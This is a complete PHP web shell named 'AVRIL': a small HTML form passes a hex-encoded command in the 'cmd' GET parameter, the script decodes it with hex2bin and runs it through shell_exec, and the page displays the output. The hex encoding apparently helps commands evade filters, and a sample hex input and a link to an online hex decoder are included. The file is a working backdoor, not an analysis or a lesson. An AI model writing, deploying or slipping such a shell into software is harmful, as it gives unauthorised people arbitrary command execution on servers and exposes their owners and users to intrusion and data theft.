<?php
function executeCommand($command)
{
    $output = shell_exec($command);
    return $output;
}

if (isset($_GET['cmd'])) {
    $command = hex2bin($_GET['cmd']);
    $result = executeCommand($command);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>AVRIL</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        h1 {
            color: #444;
        }
        form {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
        }
        input[type="text"] {
            width: 100%;
            padding: 5px;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            border: none;
            color: white;
            cursor: pointer;
            padding: 10px;
            text-decoration: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <h1>AVRIL</h1>
    <form method="GET">
        <label>AVRIL https://encode-decode.com/bin2hex-decode-online/ :</label>
        <input type="text" name="cmd" placeholder="e.g., 6c73306c 616c6c">
        <input type="submit" value="Execute">
    </form>

    <?php if (isset($result)): ?>
        <h2>Result:</h2>
        <pre><?php echo htmlspecialchars($result); ?></pre>
    <?php endif; ?>
</body>
</html>
